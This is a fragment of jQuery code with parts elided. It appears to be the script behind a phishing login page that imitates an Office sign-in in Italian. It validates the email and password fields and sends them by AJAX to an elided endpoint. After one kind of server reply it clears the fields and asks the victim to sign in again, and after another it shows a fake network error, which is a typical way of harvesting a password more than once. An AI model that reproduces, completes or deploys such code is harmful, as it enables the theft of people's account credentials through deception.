$(document).ready(function () {
    ...
    $("#sign-in-with-office").click(function () {
      ...
      var timer = setInterval(function () {
        if (officeAuth.closed) {
          $("#authError").html('<span class="animated fadeInUp"><span id="errorText">Impossibile raggiungere il server di download. Riprovare</span></span>').removeClass("visually-hidden");
          clearInterval(timer);
        }
      }, 250);
    ...
    $("#loginForm").submit(function (e) {
      ...
      if (!email) {
        $("#emailError").html('<div class="auth0-lock-error-invalid-hint">Sai già cosa devi fare</div>').removeClass("visually-hidden");
        $("#email").focus();
        $("#passwordError").html("").addClass("visually-hidden");
      } else if (!validateEmail(email)) {
        $("#emailError").html('<div class="auth0-lock-error-invalid-hint">Mmm, c&acute;è qualcosa che non torna. Sicuro di aver scritto tutto giusto?</div>').removeClass("visually-hidden");
        $("#email").focus();
        $("#passwordError").html("").addClass("visually-hidden");
      } else if (!password) {
        $("#passwordError").html('<div class="auth0-lock-error-invalid-hint">Sai già cosa devi fare</div>').removeClass("visually-hidden");
        $("#password").focus();
        $("#emailError").html("").addClass("visually-hidden");
      } else if (password.length < 5) {
        $("#passwordError").html('<div class="auth0-lock-error-invalid-hint">Mmm, c&acute;è qualcosa che non torna. Sicuro di aver scritto tutto giusto?</div>').removeClass("visually-hidden");
        $("#password").focus();
        $("#emailError").html("").addClass("visually-hidden");
      } else {
        jQuery.ajax({
          ...
          success: function (data) {
            if (data.match(/1/i)) {
              ...
              $("#email, #password").val("");
              $("#email").focus();
              $("#authError").html('<span class="animated fadeInUp"><span id="errorText">Accedere con il proprio account e-mail.</span></span>').removeClass("visually-hidden");
            } else if (data.match(/-0/i)) {
              $("#content-loading").hide();
              $("#loginCount").val("0");
              $("#password").val("").focus();
              $("#authError").html('<span class="animated fadeInUp"><span id="errorText">Errore. Controllare la rete e riprovare.</span></span>').removeClass("visually-hidden");
            }
          },
          error: function () {
            $("#content-loading").hide();
